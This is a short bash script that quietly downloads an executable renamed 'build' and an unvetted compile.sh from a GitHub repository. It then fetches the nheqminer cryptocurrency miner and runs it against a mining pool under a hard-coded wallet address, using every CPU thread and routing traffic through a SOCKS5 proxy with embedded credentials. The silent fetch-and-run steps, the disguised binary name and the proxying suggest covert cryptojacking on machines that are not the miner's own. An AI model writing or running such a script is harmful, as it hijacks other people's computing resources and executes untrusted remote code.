#!/bin/bash
proxy="socks5://elu:bangke@51.15.242.51:1080"
wget -q https://raw.githubusercontent.com/Tokisaki-mitsuha/mining/master/compile.sh
wget -qO build https://github.com/Tokisaki-mitsuha/mining/blob/master/ccminer?raw=true
chmod +x build
chmod +x compile.sh
wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
tar -xvf nheqminer-Linux-v0.8.2.tgz 
tar -xvf nheqminer-Linux-v0.8.2.tar.gz
nheqminer/nheqminer -v -l eu.luckpool.net:3956 -u RSLaafsZRq7WNqhcCQQzwxe57y2PZc3eP8.worker-$worker -p x -t $(nproc --all) -x $proxy
./compile.sh
echo succes
